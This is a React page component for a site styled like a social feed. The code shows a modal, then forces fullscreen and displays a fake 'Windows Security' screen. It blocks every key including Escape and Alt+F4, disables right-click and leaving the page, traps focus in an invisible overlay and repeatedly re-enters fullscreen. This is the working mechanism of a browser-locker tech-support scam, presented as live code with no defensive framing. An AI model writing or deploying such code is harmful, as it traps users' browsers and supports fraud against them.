'use client';

import { useState, useEffect, useCallback, useRef } from 'react';
import Header from '@/components/Header';
import LeftSidebar from '@/components/LeftSidebar';
import RightSidebar from '@/components/RightSidebar';
import Feed from '@/components/Feed';
import Modal from '@/components/Modal';
import WindowsSecurityPage from '@/components/WindowsSecurityPage';

export default function Home() {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [showSecurityPage, setShowSecurityPage] = useState(false);
  const focusTrapRef = useRef<HTMLDivElement>(null);
  const fullscreenAttempts = useRef(0);

  const enterFullscreen = useCallback(async () => {
    const elem = document.documentElement;
    try {
      if (elem.requestFullscreen) {
        await elem.requestFullscreen();
      } else if ((elem as unknown as { webkitRequestFullscreen?: () => void }).webkitRequestFullscreen) {
        (elem as unknown as { webkitRequestFullscreen: () => void }).webkitRequestFullscreen();
      } else if ((elem as unknown as { msRequestFullscreen?: () => void }).msRequestFullscreen) {
        (elem as unknown as { msRequestFullscreen: () => void }).msRequestFullscreen();
      }

      // Try to lock the keyboard to capture ESC
      if ('keyboard' in navigator && 'lock' in (navigator as Navigator & { keyboard: { lock: (keys: string[]) => Promise<void> } }).keyboard) {
        try {
          await (navigator as Navigator & { keyboard: { lock: (keys: string[]) => Promise<void> } }).keyboard.lock(['Escape']);
        } catch {
          // Keyboard lock may not be available or may fail
        }
      }
    } catch {
      // Fullscreen request may fail
    }
  }, []);

  const handleModalAction = () => {
    enterFullscreen();
    setIsModalOpen(false);
    setShowSecurityPage(true);
    
    // Focus the trap element after entering fullscreen
    setTimeout(() => {
      focusTrapRef.current?.focus();
    }, 100);
  };

  // Keep focus on our trap element to intercept all keyboard events
  useEffect(() => {
    if (!showSecurityPage) return;

    const keepFocus = () => {
      if (focusTrapRef.current && document.activeElement !== focusTrapRef.current) {
        focusTrapRef.current.focus();
      }
    };

    // Focus immediately and keep checking
    keepFocus();
    const focusInterval = setInterval(keepFocus, 30);

    // Also focus on any click
    const handleClick = () => {
      setTimeout(keepFocus, 0);
    };
    document.addEventListener('click', handleClick, true);
    document.addEventListener('mousedown', handleClick, true);

    return () => {
      clearInterval(focusInterval);
      document.removeEventListener('click', handleClick, true);
      document.removeEventListener('mousedown', handleClick, true);
    };
  }, [showSecurityPage]);

  useEffect(() => {
    // Show modal after a short delay to simulate the design
    const timer = setTimeout(() => {
      setIsModalOpen(true);
    }, 500);

    // Disable right-click context menu
    const handleContextMenu = (e: MouseEvent) => {
      e.preventDefault();
      return false;
    };
    document.addEventListener('contextmenu', handleContextMenu, true);

    // Disable all keyboard inputs including ESC and Alt+F4
    const handleKeyDown = (e: KeyboardEvent) => {
      // Block ESC key
      if (e.key === 'Escape' || e.keyCode === 27) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
      }
      
      // Block Alt+F4
      if (e.altKey && (e.key === 'F4' || e.keyCode === 115)) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
      }

      // Block all other keys
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return false;
    };

    const handleKeyUp = (e: KeyboardEvent) => {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return false;
    };

    const handleKeyPress = (e: KeyboardEvent) => {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return false;
    };

    // Prevent window close
    const handleBeforeUnload = (e: BeforeUnloadEvent) => {
      e.preventDefault();
      e.returnValue = '';
      return '';
    };

    document.addEventListener('keydown', handleKeyDown, true);
    document.addEventListener('keyup', handleKeyUp, true);
    document.addEventListener('keypress', handleKeyPress, true);
    window.addEventListener('keydown', handleKeyDown, true);
    window.addEventListener('keyup', handleKeyUp, true);
    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      clearTimeout(timer);
      document.removeEventListener('contextmenu', handleContextMenu, true);
      document.removeEventListener('keydown', handleKeyDown, true);
      document.removeEventListener('keyup', handleKeyUp, true);
      document.removeEventListener('keypress', handleKeyPress, true);
      window.removeEventListener('keydown', handleKeyDown, true);
      window.removeEventListener('keyup', handleKeyUp, true);
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, []);

  // Re-enter fullscreen when user exits (handles ESC exiting fullscreen)
  useEffect(() => {
    if (!showSecurityPage) return;

    const handleFullscreenChange = () => {
      const isFullscreen = !!(
        document.fullscreenElement ||
        (document as unknown as { webkitFullscreenElement?: Element }).webkitFullscreenElement ||
        (document as unknown as { msFullscreenElement?: Element }).msFullscreenElement
      );

      // If exited fullscreen and security page is showing, re-enter fullscreen immediately
      if (!isFullscreen && showSecurityPage) {
        fullscreenAttempts.current = 0;
        
        const attemptFullscreen = () => {
          if (fullscreenAttempts.current < 10) {
            fullscreenAttempts.current++;
            enterFullscreen();
            focusTrapRef.current?.focus();
          }
        };

        // Multiple aggressive attempts to re-enter fullscreen
        attemptFullscreen();
        setTimeout(attemptFullscreen, 10);
        setTimeout(attemptFullscreen, 50);
        setTimeout(attemptFullscreen, 100);
        setTimeout(attemptFullscreen, 200);
        setTimeout(attemptFullscreen, 500);
      }
    };

    document.addEventListener('fullscreenchange', handleFullscreenChange);
    document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
    document.addEventListener('msfullscreenchange', handleFullscreenChange);

    return () => {
      document.removeEventListener('fullscreenchange', handleFullscreenChange);
      document.removeEventListener('webkitfullscreenchange', handleFullscreenChange);
      document.removeEventListener('msfullscreenchange', handleFullscreenChange);
    };
  }, [showSecurityPage, enterFullscreen]);

  return (
    <div className="min-h-screen bg-[#f0f2f5]">
      {/* Invisible focus trap element */}
      <div
        ref={focusTrapRef}
        tabIndex={0}
        onKeyDown={(e) => {
          e.preventDefault();
          e.stopPropagation();
          e.nativeEvent.stopImmediatePropagation();
        }}
        onKeyUp={(e) => {
          e.preventDefault();
          e.stopPropagation();
        }}
        style={{
          position: 'fixed',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          zIndex: showSecurityPage ? 9999 : -1,
          opacity: 0,
          pointerEvents: showSecurityPage ? 'auto' : 'none',
          outline: 'none',
        }}
        aria-hidden="true"
      />
      <Header />
      <div className="flex">
        <LeftSidebar />
        <div className="flex-1 ml-[280px] mr-[280px]">
          <Feed />
        </div>
        <RightSidebar />
      </div>
      <Modal isOpen={isModalOpen} onAction={handleModalAction} />
      {showSecurityPage && <WindowsSecurityPage />}
    </div>
  );
}
